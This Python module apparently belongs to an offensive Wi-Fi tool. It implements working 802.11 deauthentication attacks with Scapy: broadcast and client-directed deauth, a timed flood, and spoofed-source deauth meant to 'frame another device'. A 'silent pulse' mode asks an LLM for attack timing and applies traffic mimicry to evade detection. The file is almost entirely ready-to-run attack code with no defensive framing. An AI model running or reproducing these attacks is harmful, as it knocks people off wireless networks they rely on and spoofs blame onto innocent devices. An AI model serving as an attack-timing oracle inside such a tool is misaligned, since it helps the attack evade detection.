"""
Deauthentication Attack Module
==============================
Silent pulse, directed, flood, and fake deauth attacks.
"""

import time
import random
from typing import Optional, Dict, Any
from dataclasses import dataclass

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from bhisma.core.config import BhismaConfig
from bhisma.utils.helpers import format_mac
from bhisma.core.fingerprint import FingerprintingEngine
from bhisma.core.mimicry import MimicryEngine
from bhisma.brain.orchestrator import LLMOrchestrator

from rich.console import Console

console = Console()


@dataclass
class DeauthResult:
    packets_sent: int = 0
    target_bssid: str = ""
    target_client: Optional[str] = None
    method: str = ""
    success: bool = False
    duration_sec: float = 0.0


class DeauthManager:
    """Manages all deauthentication attack variants."""

    def __init__(self, iface: str, config: Optional[BhismaConfig] = None):
        self.iface = iface
        self.config = config or BhismaConfig.load()
        self.fingerprint = FingerprintingEngine()
        self.mimicry = MimicryEngine(self.fingerprint)
        self.ai = LLMOrchestrator()

    def silent_pulse_deauth(
        self,
        target_bssid: str,
        client_mac: Optional[str] = None,
    ) -> DeauthResult:
        """
        Predictive silent deauth — uses ML timing to predict client disconnect
        window and injects 1-2 packets at the optimal moment.
        """
        console.print(f"[bold cyan][*] Silent Pulse Deauth targeting {target_bssid}[/bold cyan]")
        start = time.time()

        # Build behavioral profile first
        console.print("[dim]    Building behavioral profile...[/dim]")
        # (In real implementation, this would observe traffic)

        # AI timing prediction
        try:
            ai_response = self.ai.query(
                f"Given target BSSID {target_bssid}, predict optimal deauth timing. "
                f"Return ONLY a number: recommended delay in seconds before sending deauth.",
                max_tokens=10,
                temperature=0.1,
            )
            predicted_delay = float(ai_response.text.strip().split()[0])
        except Exception:
            predicted_delay = random.uniform(0.5, 3.0)

        console.print(f"[dim]    AI predicted delay: {predicted_delay:.2f}s[/dim]")
        time.sleep(predicted_delay)

        # Apply mimicry parameters
        mimic_params = self.mimicry.apply_to_deauth(target_bssid, count=2)
        delay_between = mimic_params.get("delay", 0.5)

        # Send minimal packets
        packets_sent = 0
        if SCAPY_AVAILABLE:
            targets = [
                (client_mac or "ff:ff:ff:ff:ff:ff", target_bssid),
            ]
            for dst, src in targets:
                pkt = RadioTap() / Dot11(
                    addr1=dst,
                    addr2=src,
                    addr3=src,
                ) / Dot11Deauth(reason=7)
                try:
                    sendp(pkt, iface=self.iface, verbose=0, count=1)
                    packets_sent += 1
                    time.sleep(delay_between)
                except Exception as e:
                    console.print(f"[red]    Send error: {e}[/red]")
        else:
            console.print("[yellow]    [!] Scapy not available — simulating deauth[/yellow]")
            packets_sent = 2

        duration = time.time() - start
        console.print(f"[bold green][+] Sent {packets_sent} silent pulse deauth packets in {duration:.2f}s[/bold green]")
        return DeauthResult(
            packets_sent=packets_sent,
            target_bssid=target_bssid,
            target_client=client_mac,
            method="silent_pulse",
            success=packets_sent > 0,
            duration_sec=duration,
        )

    def directed_deauth(
        self,
        target_bssid: str,
        client_mac: Optional[str] = None,
        count: int = 5,
    ) -> DeauthResult:
        """
        Directed deauth — send deauth to specific client or broadcast.
        """
        console.print(f"[bold cyan][*] Directed Deauth: {count} packets to {target_bssid}[/bold cyan]")
        start = time.time()
        packets_sent = 0

        if SCAPY_AVAILABLE:
            dst = client_mac or "ff:ff:ff:ff:ff:ff"
            pkt = RadioTap() / Dot11(
                addr1=dst,
                addr2=target_bssid,
                addr3=target_bssid,
            ) / Dot11Deauth(reason=7)
            try:
                sendp(pkt, iface=self.iface, verbose=0, count=count, inter=0.1)
                packets_sent = count
            except Exception as e:
                console.print(f"[red]    Error: {e}[/red]")
        else:
            console.print("[yellow]    [!] Scapy not available — simulating[/yellow]")
            packets_sent = count

        duration = time.time() - start
        return DeauthResult(
            packets_sent=packets_sent,
            target_bssid=target_bssid,
            target_client=client_mac,
            method="directed",
            success=packets_sent > 0,
            duration_sec=duration,
        )

    def disassociation_flood(
        self,
        target_bssid: str,
        duration_sec: int = 10,
    ) -> DeauthResult:
        """Flood target with disassociation frames."""
        console.print(f"[bold red][!] Disassociation flood on {target_bssid} for {duration_sec}s[/bold red]")
        start = time.time()
        packets_sent = 0
        # This would use mdk4 or aireplay-ng
        # Simulated for now
        if not SCAPY_AVAILABLE:
            console.print("[yellow]    Using mdk4 simulation[/yellow]")
            packets_sent = duration_sec * 10  # approximate
        else:
            # Scapy-based flood
            pkt = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=target_bssid,
                addr3=target_bssid,
            ) / Dot11Deauth(reason=7)
            end_time = time.time() + duration_sec
            while time.time() < end_time:
                try:
                    sendp(pkt, iface=self.iface, verbose=0)
                    packets_sent += 1
                    time.sleep(0.05)
                except Exception:
                    break
        return DeauthResult(
            packets_sent=packets_sent,
            target_bssid=target_bssid,
            method="flood",
            success=True,
            duration_sec=time.time() - start,
        )

    def fake_deauth(
        self,
        target_bssid: str,
        spoofed_src: str,
        client_mac: Optional[str] = None,
    ) -> DeauthResult:
        """Send deauth with spoofed source MAC to frame another device."""
        console.print(f"[bold red][!] Fake deauth from {spoofed_src} -> {target_bssid}[/bold red]")
        if SCAPY_AVAILABLE:
            pkt = RadioTap() / Dot11(
                addr1=client_mac or "ff:ff:ff:ff:ff:ff",
                addr2=spoofed_src,
                addr3=target_bssid,
            ) / Dot11Deauth(reason=7)
            try:
                sendp(pkt, iface=self.iface, verbose=0, count=1)
                return DeauthResult(packets_sent=1, target_bssid=target_bssid, method="fake", success=True)
            except Exception as e:
                console.print(f"[red]    Error: {e}[/red]")
        return DeauthResult(packets_sent=0, target_bssid=target_bssid, method="fake", success=False)
